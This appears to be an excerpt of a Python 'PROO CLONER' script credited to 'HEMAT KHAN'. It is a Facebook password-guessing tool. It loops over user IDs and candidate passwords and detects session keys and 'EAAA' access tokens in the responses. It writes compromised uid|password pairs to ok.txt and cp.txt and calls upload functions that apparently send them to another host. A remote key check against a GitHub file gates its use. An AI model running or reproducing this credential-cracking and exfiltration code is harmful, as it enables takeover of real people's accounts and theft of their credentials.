...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/HemtKhan/HEMAT2009/main/public.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : HEMAT\033[1;32m[KHAN]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mTEAM HEMAT KHAN\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  GO DAR GO           │
\033[1;36m│ [✓] POWER KHAN : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 𝐻𝐸𝑀𝐴𝑇 𝑈𝐿𝐿𝐴𝐻 𝐽𝐴𝐿𝐴𝐿𝑍𝐴𝐼\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %s𝐻𝐸𝑀𝐴𝑇 ❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [𝑯𝑬𝑴𝑨𝑻] : %s/%s -> \033[0;92m [ 𝑯𝑬𝑴𝑨𝑻-OK:%s ]- \033[0;91m[𝑯𝑬𝑴𝑨𝑻-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[𝑯𝑬𝑴𝑨𝑻-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [𝑯𝑬𝑴𝑨𝑻-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[𝑯𝑬𝑴𝑨𝑻-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [𝑯𝑬𝑴𝑨𝑻-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
